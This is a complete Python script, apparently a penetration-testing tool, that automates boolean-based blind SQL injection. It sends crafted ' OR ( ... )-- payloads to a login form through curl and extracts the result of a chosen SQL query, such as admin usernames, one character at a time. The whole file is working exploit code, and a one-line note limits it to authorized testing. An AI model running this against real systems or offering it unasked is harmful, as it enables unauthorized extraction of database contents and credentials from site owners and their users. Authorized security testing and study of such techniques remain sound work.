#!/usr/bin/env python3
"""
blind-sqli.py — Boolean-based blind SQL injection extractor.

Extracts data character-by-character from a SQL injection point where the
response differs between a true and a false condition (no union reflection
required).

Usage:
    python3 blind-sqli.py \
        --url https://target/login \
        --param username \
        --true "Invalid password" \
        --false "Unknown user" \
        --extra password=x \
        --expr "SELECT username FROM admins"

Designed for authorized testing only. Do not use against systems you do not
own or have written permission to test.
"""

import argparse
import subprocess
import sys
import time


def probe(url, param, payload, method, extra_data, true_str, false_str,
          timeout=25, retries=3, delay=0.2, debug=False):
    """Send a request and evaluate the boolean condition from the response."""
    for attempt in range(retries):
        try:
            cmd = ["curl", "-s", "--max-time", str(timeout), "-X", method, url]
            cmd += ["--data-urlencode", f"{param}={payload}"]
            for k, v in extra_data.items():
                cmd += ["--data-urlencode", f"{k}={v}"]

            if debug:
                print(f"[DEBUG] {' '.join(cmd)}", file=sys.stderr)

            r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout + 5)
            time.sleep(delay)
            body = r.stdout

            # Check for the false string first (safer: "Unknown user" is more specific)
            if false_str and false_str in body:
                return False
            if true_str and true_str in body:
                return True

            # Ambiguous
            if debug:
                print(f"[DEBUG] ambiguous body (first 200 chars): {body[:200]!r}", file=sys.stderr)
            print(f"[!] ambiguous response (attempt {attempt+1}/{retries})", file=sys.stderr)
        except subprocess.TimeoutExpired:
            print(f"[!] timeout (attempt {attempt+1}/{retries})", file=sys.stderr)
            time.sleep(1)
    return None


def extract(args, expr):
    def check(cond):
        payload = f"{args.prefix}{cond}{args.suffix}"
        return probe(args.url, args.param, payload, args.method, args.extra,
                     args.true, args.false, delay=args.delay, debug=args.debug)

    # Determine length
    print(f"[*] determining length of: {expr}", file=sys.stderr)
    length = None
    for n in range(1, args.max_len + 1):
        res = check(f"LENGTH(({expr}))={n}")
        if res is True:
            length = n
            print(f"[+] length = {length}", file=sys.stderr)
            break
    if length is None:
        print("[-] could not determine length", file=sys.stderr)
        return None

    # Extract each character
    result = ""
    for i in range(1, length + 1):
        found = False
        for c in args.charset:
            esc = c.replace("'", "''")
            res = check(f"SUBSTR(({expr}),{i},1)='{esc}'")
            if res is True:
                result += c
                print(f"[+] {i}/{length}: {c!r}  ->  {result!r}", file=sys.stderr)
                found = True
                break
        if not found:
            result += "?"
            print(f"[?] {i}/{length}: UNKNOWN  ->  {result!r}", file=sys.stderr)
    return result


def main():
    p = argparse.ArgumentParser(description="Blind boolean-based SQL injection extractor")
    p.add_argument("--url", required=True, help="Vulnerable endpoint URL")
    p.add_argument("--param", default="username", help="Vulnerable parameter name")
    p.add_argument("--method", default="POST", help="HTTP method (default: POST)")
    p.add_argument("--true", required=True, help="String present on TRUE condition")
    p.add_argument("--false", required=True, help="String present on FALSE condition")
    p.add_argument("--expr", required=True, help="SQL expression to extract")
    p.add_argument("--prefix", default="' OR (", help="SQL prefix before condition")
    p.add_argument("--suffix", default=")-- ", help="SQL suffix after condition")
    p.add_argument("--charset",
                   default="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-{}^$@.!",
                   help="Character set for extraction")
    p.add_argument("--max-len", type=int, default=64, help="Maximum string length to try")
    p.add_argument("--delay", type=float, default=0.2, help="Delay between requests (seconds)")
    p.add_argument("--extra", action="append", default=[],
                   help="Extra form fields as key=value (repeatable). Example: --extra password=x")
    p.add_argument("--debug", action="store_true", help="Print raw requests and responses")
    args = p.parse_args()
    args.extra = dict(kv.split("=", 1) for kv in args.extra)

    result = extract(args, args.expr)
    if result is not None:
        print(result)


if __name__ == "__main__":
    main()
